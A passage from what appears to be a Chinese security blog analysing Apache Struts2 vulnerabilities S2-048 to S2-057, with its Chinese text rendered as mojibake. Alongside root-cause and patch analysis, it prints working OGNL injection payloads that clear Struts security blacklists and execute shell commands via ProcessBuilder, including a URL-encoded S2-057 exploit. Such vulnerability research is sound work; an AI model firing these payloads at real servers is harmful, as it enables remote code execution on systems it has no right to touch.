<p>ä¸»è¦çœ‹5-10è¡Œï¼Œä¸€å¼€å§‹çš„æ€è·¯æ˜¯ç›´æ¥ç”¨èµ‹å€¼çš„æ–¹å¼æ¥è¦†ç›–å­˜åœ¨é™åˆ¶çš„SecurityMemberAccessï¼Œä½†æ˜¯ç°åœ¨æœ‰äº†<code>excludedClasses</code>çš„é™åˆ¶ä¸èƒ½ç›´æ¥ç”¨è¿™ç§æ–¹å¼æ¥è¾¾æˆï¼ˆå…·ä½“çœ‹<code>SecurityMemberAccess.isAccessible</code>ï¼‰ã€‚</p>
<p>é‚£ä¹ˆå°±çœ‹çœ‹èƒ½ä¸èƒ½ç”¨setterså»è®¾ç½®<code>SecurityMemberAccess</code></p>
<p>è¿™é‡Œå°±çœ‹<code>ognl.OgnlContext#setMemberAccess</code>ï¼Œè€Œè¿™ä¸ªcontextå°±æ˜¯æˆ‘ä»¬åœ¨OGNLè¡¨è¾¾å¼é‡Œç”¨<code>#context</code>è¡¨ç¤ºçš„</p>
<p>é‚£ä¹ˆç›´æ¥ç”¨<code>#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code>å°±å¯ä»¥è¦†ç›–åŸæœ‰çš„MemberAccessï¼Œä½†æ˜¯å› ä¸º<code>#context</code>æœ¬èº«å°±æ˜¯è¢«ç¦æ­¢çš„ç±»ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ä»–ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦é¦–å…ˆå»é™¤æ‰<code>ExcludedPackageNames</code>å’Œ<code>ExcludedClasses</code></p>
<p>æ¥çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆè®¾ç½®çš„<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil</code></p>
<p><img src="/assets/talk_about_struts2/image-20200521172344561.png" alt="image-20200521172344561"></p>
<p>å¯ä»¥çœ‹åˆ°<code>securityMemberAccess</code>çš„ç›¸å…³ç¦ç”¨è®¾ç½®éƒ½æ˜¯æ¥è‡ªäº<code>ognlUtil</code>ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªéœ€è¦æ¸…é™¤æ‰<code>ognlUtil</code>çš„ç¦ç”¨è®¾ç½®å°±å¯ä»¥æ¶ˆé™¤æ‰<code>securityMemberAccess</code>çš„é™åˆ¶ã€‚è¿™æ˜¯å› ä¸ºåœ¨jvmé‡Œé¢ä»–ä»¬ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹ã€‚</p>
<p>æ‰€ä»¥ä¸Šé¢çš„POCä¸­ç”¨struts2çš„containerçš„æ–¹å¼å»è·å–ognlUtilå®ä¾‹ï¼Œå¹¶å°†å…¶ç¦ç”¨è®¾ç½®å…¨éƒ¨æ¸…é™¤æ‰</p>
<p>é‚£ä¹ˆåé¢å†ç”¨<code>#context.setMemberAccess</code>å°±æ²¡æœ‰é˜»ç¢äº†</p>
<p>åç»­çš„ä»£ç å°±æ˜¯æ‰§è¡Œå¹¶å›æ˜¾äº†ï¼Œè·Ÿå‰é¢çš„ç±»ä¼¼</p>
<h3 id="ä¿®å¤-9"><a href="#ä¿®å¤-9" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p><img src="/assets/talk_about_struts2/image-20200521204140738.png" alt="image-20200521204140738"></p>
<p>ä¿®å¤ä¸»è¦æ˜¯ä¸æŠŠmessageä¼ å…¥ï¼Œæ”¾åˆ°äº†argsçš„ä½ç½®</p>
<h2 id="15-S2-048"><a href="#15-S2-048" class="headerlink" title="15. S2-048"></a>15. S2-048</h2><p>è¿™ä¸€éƒ¨åˆ†ä¸ä»”ç»†è¯´äº†ï¼Œçœ‹<a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p>
<h2 id="16-S2-052"><a href="#16-S2-052" class="headerlink" title="16. S2-052"></a>16. S2-052</h2><p>å½±å“èŒƒå›´:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
<blockquote>
<p>The REST Plugin is using a <code>XStreamHandler</code> with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.</p>
</blockquote>
<p>struts2çš„restæ’ä»¶æ³¨å†Œäº†ContentTypeInterceptoræ¥å¤„ç†ä¸åŒçš„content-type</p>
<p><img src="/assets/talk_about_struts2/image-20200522100814912.png" alt="image-20200522100814912"></p>
<p>é’ˆå¯¹xmlç±»å‹ï¼Œå°†è°ƒç”¨<code>XStreamHandler</code>æ¥å¤„ç†</p>
<p><code>org.apache.struts2.rest.ContentTypeInterceptor#intercept</code></p>
<p><img src="/assets/talk_about_struts2/image-20200522101114659.png" alt="image-20200522101114659"></p>
<p>æ ¹æ®requestè¯·æ±‚é€‰æ‹©handlerï¼Œè¿™é‡Œæˆ‘ä»¬ä¼ å…¥<code>application/xml</code>ç±»å‹ï¼Œå°†ä½¿ç”¨<code>org.apache.struts2.rest.handler.XStreamHandler#toObject</code>æ¥å¤„ç†xml</p>
<p><img src="/assets/talk_about_struts2/image-20200522101244620.png" alt="image-20200522101244620"></p>
<p>è¿™é‡Œç”¨äº†æœ€ç®€å•çš„è°ƒç”¨æ–¹å¼ï¼ˆ1.4.8ç‰ˆæœ¬ï¼‰ï¼Œæ²¡æœ‰åšxstreamçš„ç›¸å…³å®‰å…¨å¤„ç†ï¼Œå¯¼è‡´XStreamååºåˆ—åŒ–</p>
<p>æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥æ„é€ å¥½çš„XMLå°±å¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="POC-11"><a href="#POC-11" class="headerlink" title="POC"></a>POC</h3><p>è¿™é‡Œçš„xmlå¯ä»¥ç”¨æˆ‘çš„ysomapå»ç”Ÿæˆï¼ŒæŠŠContent-Typeè®¾ç½®æˆ<code>application/xml</code>å°±å¯ä»¥äº†</p>
<h3 id="ä¿®å¤-10"><a href="#ä¿®å¤-10" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>S2-052è·Ÿä»¥å¾€çš„æ¼æ´ä¸ä¸€æ ·ï¼Œè¿™é‡Œè·ŸOGNLè¡¨è¾¾å¼å¹¶æ²¡æœ‰ä»€ä¹ˆå…³ç³»äº†ï¼Œä¿®å¤ä¹Ÿæ¯”è¾ƒç®€å•</p>
<p>å‡çº§XStreamåˆ°äº†1.4.10ç‰ˆæœ¬ï¼Œå¹¶ä¸”æ·»åŠ äº†å®‰å…¨æªæ–½</p>
<p><img src="/assets/talk_about_struts2/image-20200522102217477.png" alt="image-20200522102217477"></p>
<p>è¿™é‡Œæ–°æ·»åŠ äº†<code>AllowedClasses</code>ã€<code>AllowedClassNames</code>ã€<code>XStreamPermissionProvider</code>æ¥è®¾ç½®æ¯ä¸ªç±»å¯ä»¥ååºåˆ—åŒ–çš„å¯¹è±¡åˆ—è¡¨</p>
<p>ä¹Ÿä¼šæ·»åŠ ä¸€äº›é»˜è®¤çš„ç±»</p>
<p><img src="/assets/talk_about_struts2/image-20200522102927472.png" alt="image-20200522102927472"></p>
<p>è¿™é‡Œçš„ç”¨æ³•å°±æ˜¯XStreamå®˜æ–¹æ¨èçš„ï¼Œé‡‡ç”¨ç™½åå•çš„æ–¹å¼æ¥é˜²æ­¢ä¸å®‰å…¨çš„ååºåˆ—åŒ–</p>
<h2 id="17-S2-053"><a href="#17-S2-053" class="headerlink" title="17. S2-053"></a>17. S2-053</h2><p>å½±å“ç‰ˆæœ¬:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1</p>
<p>S2-053é—®é¢˜å‡ºåœ¨freemarkerçš„æ ‡ç­¾å†…å®¹å¯æ§æ—¶å‡ºç°çš„é—®é¢˜</p>
<p><img src="/assets/talk_about_struts2/image-20200522103937515.png" alt="image-20200522103937515"></p>
<p>åœ¨actionæ‰§è¡Œç»“æŸåï¼Œç”±äºè®¾ç½®çš„ç±»å‹ä¸ºfreemarkerï¼Œæ‰€ä»¥ç»“æœäº¤ç”±freemarkeræ¥å¤„ç†</p>
<p><img src="/assets/talk_about_struts2/image-20200522111039529.png" alt="image-20200522111039529"></p>
<p>å…³æ³¨å¯¹freemarkeræ ‡ç­¾è§£æçš„ç±»<code>org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart</code></p>
<p><img src="/assets/talk_about_struts2/image-20200522111238176.png" alt="image-20200522111238176"></p>
<p>å› ä¸ºè¿™é‡Œæˆ‘ä»¬æ—¶urlæ ‡ç­¾ï¼Œæ‰€ä»¥ç”±<code>org.apache.struts2.components.URL#start</code>æ¥å¤„ç†</p>
<p><img src="/assets/talk_about_struts2/image-20200522111315111.png" alt="image-20200522111315111"></p>
<p>å›åˆ°äº†ç”±<code>ServletUrlRenderer</code>æ¥è§£ææˆ‘ä»¬ä¼ å…¥çš„OGNLè¡¨è¾¾å¼ï¼Œè·ŸS2-013ä¸€æ ·ï¼Œåç»­ä¹Ÿæ˜¯ç”±<code>TextParseUtil.translateVariables</code>è§¦å‘çš„</p>
<h3 id="POC-12"><a href="#POC-12" class="headerlink" title="POC"></a>POC</h3><p>pocå¯ä»¥ç›´æ¥ç”¨S2-045çš„poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"><span class="comment">// è®°å¾—ç¼–ç </span></span><br></pre></td></tr></table></figure>
<h3 id="ä¿®å¤-11"><a href="#ä¿®å¤-11" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><blockquote>
<p>è¿™æ¬¡çš„ä¿®å¤æ˜¯åœ¨FreemarkerManagerä¸­å¤šäº†ä¸¤è¡Œä»£ç ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;  LOG.debug(&quot;Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER&quot;, new String[0]);</span><br><span class="line">&gt; configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>å»çœ‹äº†ä¸€ä¸‹TemplateClassResolver.SAFER_RESOLVER)çš„å®˜æ–¹æ–‡æ¡£ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>å¤§è‡´æ„æ€åº”è¯¥å°±æ˜¯ç¦æ­¢äº†freemarkerçš„RCEï¼Œå…·ä½“æˆ‘å¯¹freemarkerä¸å¤ªäº†è§£ï¼Œå°±ä¸å»è¯¯äººå­å¼Ÿäº†ã€‚</p>
</blockquote>
<p>ä¿®å¤ç›´æ¥å‚è€ƒ<a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p>
<h2 id="18-S2-055"><a href="#18-S2-055" class="headerlink" title="18. S2-055"></a>18. S2-055</h2><p>å½±å“èŒƒå›´ï¼šStruts 2.5 - Struts 2.5.14</p>
<p>S2-055æ¼æ´åŸç†è·ŸS2-052ä¸€æ ·ï¼Œç”±jacksonåº“å¤„ç†jsonå†…å®¹æ—¶äº§ç”Ÿçš„æ¼æ´ï¼Œè¿™é‡Œé»˜è®¤ä¸æ˜¯ç”¨jacksonå¤„ç†jsonå†…å®¹çš„ï¼Œå¾—åœ¨struts.xmlé…ç½®</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">type</span>=<span class="string">"org.apache.struts2.rest.handler.ContentTypeHandler"</span> <span class="attr">name</span>=<span class="string">"jackson"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.rest.handler.JacksonLibHandler"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.rest.handlerOverride.json"</span> <span class="attr">value</span>=<span class="string">"jackson"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæœ¬èº«æ˜¯å› ä¸ºjacksonååºåˆ—åŒ–é—®é¢˜äº§ç”Ÿçš„ï¼Œåé¢æŠ½ç©ºåˆ†æä¸€ä¸‹è¿™ä¸ªjacksonï¼Œè¿™é‡Œä¸ç»§ç»­åˆ†æäº†</p>
<p>å› ä¸ºéœ€è¦é…ç½®æ‰å¯ä»¥æ‰“ï¼Œæ‰€ä»¥è¿™é‡Œçš„å±å®³å¹¶æ²¡æœ‰æƒ³xstreamä¸€æ ·ä¸¥é‡</p>
<p>å…·ä½“åˆ†æè§<a href="http://xxlegend.com/2017/12/06/S2-055æ¼æ´ç¯å¢ƒæ­å»ºä¸åˆ†æ/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
<h2 id="19-S2-057"><a href="#19-S2-057" class="headerlink" title="19. S2-057"></a>19. S2-057</h2><p>å½±å“èŒƒå›´ï¼šStruts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16</p>
<blockquote>
<p>åŒ—äº¬æ—¶é—´8æœˆ22æ—¥13æ—¶ï¼ŒApacheå®˜æ–¹å‘å¸ƒé€šå‘Šå…¬å¸ƒäº†Struts2ä¸­ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-11776ï¼‰ã€‚è¯¥æ¼æ´åœ¨ä¸¤ç§æƒ…å†µä¸‹å­˜åœ¨ï¼Œç¬¬ä¸€ï¼Œåœ¨xmlé…ç½®ä¸­æœªè®¾ç½®namespaceå€¼ï¼Œä¸”ä¸Šå±‚åŠ¨ä½œé…ç½®ï¼ˆupper action(s) configurationsï¼‰ä¸­æœªè®¾ç½®æˆ–ç”¨é€šé…ç¬¦namespaceå€¼ã€‚ç¬¬äºŒï¼Œä½¿ç”¨æœªè®¾ç½® valueå’Œactionå€¼çš„urlæ ‡ç­¾ï¼Œä¸”ä¸Šå±‚åŠ¨ä½œé…ç½®ï¼ˆupper action(s) configurationsï¼‰ä¸­æœªè®¾ç½®æˆ–ç”¨é€šé…ç¬¦namespaceå€¼ã€‚</p>
<p><a href="https://paper.seebug.org/682/" target="_blank" rel="noopener">https://paper.seebug.org/682/</a></p>
</blockquote>
<p>è¿™é‡Œä¸€ç§é…ç½®æ–¹æ¡ˆæ˜¯</p>
<p><img src="/assets/talk_about_struts2/image-20200522152919691.png" alt="image-20200522152919691"></p>
<p>æ²¡æœ‰é…ç½®namespaceï¼Œè®¿é—®s2057.actionéƒ½ä¼šå¯¼å‘test.actionï¼Œè¿™é‡Œå¤„ç†redirectActionçš„æ˜¯</p>
<p><img src="/assets/talk_about_struts2/image-20200522153229727.png" alt="image-20200522153229727"></p>
<p><code>org.apache.struts2.dispatcher.ServletActionRedirectResult#execute</code></p>
<p><img src="/assets/talk_about_struts2/image-20200522153556365.png" alt="image-20200522153556365"></p>
<p><code>ServletActionRedirectResult</code>ä¼šå°†namespaceä¸€èµ·æ‹¼æ¥è¿›locationï¼Œæ¯”å¦‚<code>/s2vuls/${1*2}/s2057.action</code>,å…¶namespaceä¸º<code>/${1*2}</code>,actionNameä¸ºè·³è½¬çš„testï¼Œæœ€ç»ˆlocationä¸º<code>/${1*2}/test.action</code>ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¼•å…¥äº†OGNLè¡¨è¾¾å¼ï¼Œçœ‹åç»­çš„ä¸€ä¸ªå¤„ç†</p>
<p><code>org.apache.struts2.dispatcher.StrutsResultSupport#execute</code></p>
<p><img src="/assets/talk_about_struts2/image-20200522154209594.png" alt="image-20200522154209594"></p>
<p>åˆ°è¿™é‡Œï¼Œå°±å¼€å§‹ç†Ÿæ‚‰èµ·æ¥äº†ï¼Œå°±æ˜¯S2-012çš„æ¼æ´è§¦å‘ç‚¹</p>
<p><img src="/assets/talk_about_struts2/image-20200522154315511.png" alt="image-20200522154315511"></p>
<p>ä¼ å…¥äº†<code>TextParseUtil.translateVariables</code>ï¼Œåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œåç»­å°†è°ƒç”¨OGNL.getValue</p>
<h3 id="POC-13"><a href="#POC-13" class="headerlink" title="POC"></a>POC</h3><p>åœ¨2.3.xç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥ç”¨S2-045çš„pocæ‰“</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action</span><br></pre></td></tr></table></figure>
<p>è€Œå¯¹äº2.5.xç‰ˆæœ¬ï¼Œæˆ‘ä»¬éœ€è¦å¥½å¥½åˆ†æä¸€ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#ct=#request['struts.valueStack'].context).</span><br><span class="line">(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).</span><br><span class="line">(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class="line">(#ou.setExcludedClasses('')).</span><br><span class="line">(#ou.setExcludedPackageNames('')).</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class="line">(#ct.setMemberAccess(#dm)).(#cmd='whoami').</span><br><span class="line">(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</span><br><span class="line">(#cmds=(#iswin?&#123;'cmd','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</span><br><span class="line">(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).</span><br><span class="line">(#process=#p.start()).</span><br><span class="line">(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class="line">(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»pocæ¥çœ‹ï¼Œä»ç¬¬7è¡Œå¼€å§‹éƒ½æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„æ“ä½œï¼Œé‚£ä¹ˆå‰é¢å¤šäº†é‚£ä¹ˆå¤šæ˜¯åœ¨åšä»€ä¹ˆï¼Ÿ</p>
<p>å‚è€ƒï¼š<a href="https://paper.seebug.org/794/#35-struts-2516" target="_blank" rel="noopener">https://paper.seebug.org/794/#35-struts-2516</a></p>
<p>åœ¨struts2 2.5.13ç‰ˆæœ¬ä¹‹åï¼Œognlåº“è¿›è¡Œäº†æ›´æ–°ï¼Œä»3.1.12-&gt;3.1.15ï¼Œå…¶ä¸»è¦çš„ä¸€ä¸ªå˜åŒ–æ˜¯ç¦æ­¢è®¿é—®<code>context.map</code>ï¼ŒOgnlContextçš„getã€putã€removeå‡½æ•°ä¸­éƒ½åˆ é™¤äº†å¯¹å½“å‰contextçš„æ“ä½œ</p>
<p>æ­¤å¤–ï¼Œexcludedç›¸å…³çš„é›†åˆè¢«è®¾ç½®ä¸ºä¸å¯å˜ï¼Œæ— æ³•é€šè¿‡clearçš„æ–¹å¼æ¥æ¸…é™¤</p>
<p>é’ˆå¯¹ä¸Šé¢ä¸¤ç§çš„ç»•è¿‡</p>
<blockquote>
<p>æ–‡ç« æå‡ºäº†è¿™ä¹ˆä¸€ç§æ€è·¯:</p>
<ul>
<li>æ²¡æœ‰åŠæ³•ä½¿ç”¨<code>context.map</code>ï¼Œå¯ä»¥è°ƒç”¨<code>attr</code>ï¼Œå‰æ–‡è¯´è¿‡<code>attr</code>ä¸­ä¿å­˜ç€æ•´ä¸ª<code>context</code>çš„å˜é‡ä¸æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡<code>attr</code>ä¸­çš„æ–¹æ³•è¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ª<code>context.map</code>ã€‚</li>
<li>æ²¡æœ‰åŠæ³•ç›´æ¥è°ƒç”¨<code>excludedClasses</code>ï¼Œä¹Ÿå°±ä¸èƒ½ä½¿ç”¨<code>clear</code>æ–¹æ³•æ¥æ¸…ç©ºï¼Œä½†æ˜¯è¿˜å¯ä»¥åˆ©ç”¨<code>setter</code>æ¥æŠŠ<code>excludedClasses</code>ç»™è®¾ç½®æˆç©º</li>
<li>æ¸…ç©ºäº†é»‘åå•ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>DefaultMemberAccess</code>æ¥è¦†ç›–<code>_memberAccess</code>ï¼Œæ¥æ‰§è¡Œé™æ€æ–¹æ³•äº†ã€‚</li>
</ul>
<p>è€Œè¿™é‡Œåˆä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨<code>OgnlUtil</code>çš„<code>setExcludedClasses</code>å’Œ<code>setExcludedPackageNames</code>å°†é»‘åå•ç½®ç©ºæ—¶å¹¶éæ˜¯å¯¹äºæºï¼ˆå…¨å±€çš„OgnlUtilï¼‰è¿›è¡Œç½®ç©ºï¼Œä¹Ÿå°±æ˜¯è¯´<code>_memberAccess</code>æ˜¯æºæ•°æ®çš„ä¸€ä¸ªå¼•ç”¨ï¼Œå°±åƒå‰æ–‡æ‰€è¯´çš„ï¼Œåœ¨æ¯æ¬¡<code>createAction</code>æ—¶éƒ½æ˜¯é€šè¿‡<code>setOgnlUtil</code>åˆ©ç”¨å…¨å±€çš„æºæ•°æ®åˆ›å»ºä¸€ä¸ªå¼•ç”¨ï¼Œè¿™ä¸ªå¼•ç”¨å°±æ˜¯ä¸€ä¸ª<code>MemberAccess</code>å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>_memberAccess</code>ã€‚æ‰€ä»¥è¿™é‡Œåªä¼šå½±å“è¿™æ¬¡è¯·æ±‚çš„<code>OgnlUtil</code>è€Œå¹¶æœªé‡æ–°åˆ›å»ºä¸€ä¸ªæ–°çš„<code>_memberAccess</code>å¯¹è±¡ï¼Œæ‰€ä»¥æ—§çš„<code>_memberAccess</code>å¯¹è±¡ä»æœªæ”¹å˜ã€‚</p>
<p>è€Œçªç ´è¿™ç§é™åˆ¶çš„æ–¹å¼å°±æ˜¯å†æ¬¡å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå°†ä¸Šä¸€æ¬¡è¯·æ±‚å·²ç»ç½®ç©ºçš„<code>OgnlUitl</code>ä½œä¸ºæºé‡æ–°åˆ›å»ºä¸€ä¸ª<code>_memberAccess</code>ï¼Œè¿™æ ·åœ¨ç¬¬äºŒæ¬¡è¯·æ±‚ä¸­<code>_memberAccess</code>å°±æ˜¯é»‘åå•è¢«ç½®ç©ºçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±é‡Šæ”¾äº†<code>DefaultMemberAccess</code>ï¼Œå°±å¯ä»¥è¿›è¡Œæ­£å¸¸çš„è¦†ç›–ä»¥åŠæ‰§è¡Œé™æ€æ–¹æ³•ã€‚</p>
</blockquote>
<p>çœ‹è¿‡ä¸Šé¢çš„åˆ†æåå†æ¥çœ‹pocï¼Œç¬¬äºŒè¡Œè·å–äº†contextï¼Œç¬¬3 4 5 6è¡Œæ¸…é™¤äº†excludedç›¸å…³çš„é›†åˆï¼Œä½†å…¶å½“å‰çš„è¯·æ±‚é»‘åå•è¿˜æ˜¯å­˜åœ¨çš„ï¼Œæ‰€ä»¥åœ¨2.5.xç‰ˆæœ¬æˆ‘ä»¬éœ€è¦å‘é€ä¸¤æ¬¡è¿™ä¸ªpocï¼Œç¬¬ä¸€æ¬¡æ¸…æ¥šé»‘åå•ï¼Œç¬¬äºŒæ¬¡è¦†ç›–<code>_memberAccess</code>å¹¶è°ƒç”¨é™æ€å‡½æ•°</p>
<h1 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h1><hr>
<p>åœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼Œå‚è€ƒäº†å¾ˆå¤šå¸ˆå‚…ä»¬çš„ç¬”è®°ï¼Œè¿™é‡Œç‰¹åˆ«æ„Ÿè°¢ä¸€ä¸‹XD</p>
<p>ä»æ•´ä¸ªs2æ¼æ´çš„å†ç¨‹æ¥çœ‹ï¼Œèƒ½çœ‹åˆ°å¾ˆå¤šæ¼æ´å…¶å®åˆ©ç”¨ç‚¹æ˜¯ç›¸ä¼¼çš„ï¼Œåªæ˜¯è¯´ä»å“ªä¸ªå…¥å£è¿›å»å¯èƒ½æœ‰æ‰€ä¸åŒã€‚è¿™ç§æ¼æ´çš„åˆ†ææˆ‘è®¤ä¸ºç”¨æ•°æ®æµåˆ†ææ˜¯éå¸¸åˆé€‚çš„ã€‚lgtmçš„å¸ˆå‚…å°±ç”¨äº†ä»–ä»¬çš„codeqlå‘ç°äº†S2-057è¿™ä¸ªæ¼æ´ã€‚</p>
<p>ä½†æ˜¯å®˜æ–¹åœ¨ä¸€æ¬¡æ¬¡ä¿®å¤ä¸­ï¼Œå¯¹äºognlè¡¨è¾¾å¼çš„æ‰§è¡Œé™åˆ¶çš„è¶Šæ¥è¶Šå¤šï¼Œä½¿å¾—å¦‚ä»Šå°±ç®—å‡ºç°ognlè¡¨è¾¾å¼æ³¨å…¥ä¹Ÿå¾ˆéš¾é€ æˆRCEçš„æ•ˆæœã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹<a href="https://paper.seebug.org/users/author/?nickname=lucifaer" target="_blank" rel="noopener">lucifaer</a>å¸ˆå‚…çš„é‚£ç¯‡æ–‡ç« </p>
<p>ä»æ—¶é—´çº¿æ¥çœ‹ï¼Œ</p>
<ol>
<li>struts2 2.3.14.1ä¹‹å‰ï¼Œognlè¡¨è¾¾å¼æ‰§è¡Œæ²¡æœ‰ä»€ä¹ˆéšœç¢ï¼›2.3.14.1å¢åŠ äº†<code>SecurityMemberAccess</code>ï¼Œç¦æ­¢é™æ€å‡½æ•°æ‰§è¡Œ<code>allowStaticMethodAccess=false</code>ï¼Œåœ¨ognlè¡¨è¾¾å¼é‡Œé¢å¯ä»¥é‡æ–°ç½®ä¸ºtrueï¼›åç»­è¿™ä¸ªå€¼è¢«æ”¹æˆäº†finalï¼Œæ— æ³•è¢«æ›´æ”¹</li>
